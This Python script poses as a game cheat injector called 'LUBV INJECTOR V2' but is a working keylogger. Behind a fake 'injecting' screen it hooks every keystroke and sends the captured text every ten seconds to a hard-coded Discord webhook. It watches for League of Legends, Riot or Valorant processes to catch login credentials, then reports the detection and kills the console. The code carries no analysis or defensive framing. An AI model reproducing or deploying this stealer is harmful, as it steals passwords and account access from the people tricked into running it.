import os
import sys
import time
import keyboard
import requests
import threading
import psutil
from ctypes import windll, c_int, byref

WEBHOOK_URL = "https://discord.com/api/webhooks/1530209712530919545/25UT60IatbSsawIaJVCW8wAosNEdr9e_JvOJX8mZnpA_yEi1Wo_VrkhhMUuYAXPWJGCs"

def setup_cmd():
    windll.user32.ShowWindow(windll.kernel32.GetConsoleWindow(), 3)
    windll.kernel32.SetConsoleTextAttribute(windll.kernel32.GetConsoleWindow(), 0E)
    os.system("title LUBV INJECTOR V2")
    os.system("mode con: cols=100 lines=30")

def print_big_sinan():
    os.system("cls")
    windll.kernel32.SetConsoleTextAttribute(windll.kernel32.GetConsoleWindow(), 0C)
    sinan_art = """
    ███████╗██╗███╗   ██╗ █████╗ ███╗   ██╗
    ██╔════╝██║████╗  ██║██╔══██╗████╗  ██║
    ███████╗██║██╔██╗ ██║███████║██╔██╗ ██║
    ╚════██║██║██║╚██╗██║██╔══██║██║╚██╗██║
    ███████║██║██║ ╚████║██║  ██║██║ ╚████║
    ╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═══╝
    """
    print(sinan_art)
    time.sleep(1)
    windll.kernel32.SetConsoleTextAttribute(windll.kernel32.GetConsoleWindow(), 0A)
    print("\n\n\t\t[ INJECTING... You need to start the game. ]")
    time.sleep(2)
    windll.kernel32.SetConsoleTextAttribute(windll.kernel32.GetConsoleWindow(), 0E)
    print("\n\t\t>> Waiting for login...")

log_text = ""
game_detected = False

def on_key(event):
    global log_text
    if event.event_type == keyboard.KEY_DOWN:
        if event.name == "space":
            log_text += " "
        elif event.name == "enter":
            log_text += "\n"
        elif event.name == "backspace":
            log_text = log_text[:-1]
        elif len(event.name) == 1:
            log_text += event.name

def send_to_webhook():
    global log_text, game_detected
    while True:
        time.sleep(10)
        if log_text.strip():
            data = {"content": f"```\n{log_text}\n```"}
            try:
                requests.post(WEBHOOK_URL, json=data)
                log_text = ""
            except:
                pass
        
        # Riot oyunu çalışıyor mu kontrol et
        if not game_detected:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and ('League' in proc.info['name'] or 'Riot' in proc.info['name'] or 'Valorant' in proc.info['name']):
                    game_detected = True
                    # Oyun tespit edildi, bilgi gönder ve kapat
                    requests.post(WEBHOOK_URL, json={"content": "✅ OYUN GİRİŞİ TESPİT EDİLDİ! Kapatılıyor..."})
                    os.system("taskkill /f /im cmd.exe")
                    os._exit(0)

setup_cmd()
print_big_sinan()
keyboard.on_press(on_key)
thread = threading.Thread(target=send_to_webhook, daemon=True)
thread.start()

try:
    while True:
        time.sleep(1)
except:
    pass
